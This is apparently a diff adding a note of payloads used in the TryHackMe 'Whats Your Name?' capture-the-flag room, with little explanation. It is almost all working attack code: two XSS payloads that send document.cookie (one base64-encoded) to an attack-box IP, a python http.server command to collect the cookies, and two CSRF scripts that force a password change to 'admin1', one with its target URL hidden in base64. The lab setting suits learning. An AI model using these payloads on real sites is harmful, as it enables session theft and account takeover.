@@ -1,0 +1,40 @@
+Scripts used on TryHackMe room Whats Your Name? https://tryhackme.com/r/room/whatsyourname
+
+🔒🔒 Script used on XSS🔒🔒 (change IP address to your attack box IP)
+
+<img src="empty.png" onerror="fetch('http://10.10.77.50:8000?cookie='+document.cookie); " />
+
+
+<script>var i=new Image(); i.src="http://10.10.193.5:8000?cookie="+btoa(document.cookie);</script>
+
+python3 -m http.server
+
+🔒🔒 Script used on CSRF 🔒🔒
+
+<script>
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'http://login.worldwap.thm/change_password.php', true);
+        xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
+        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+                alert("Action executed!");
+            }
+        };
+        xhr.send('action=execute&new_password=admin1');
+    </script>
+
+🔒🔒 Script used on CSRF (base64) 🔒🔒
+
+<script>
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', atob('aHR0cDovL2xvZ2luLndvcmxkd2FwLnRobS9jaGFuZ2VfcGFzc3dvcmQucGhw'), true);
+        xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
+        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+                alert("Action executed!");
+            }
+        };
+        xhr.send('action=execute&new_password=admin1');
+    </script>    
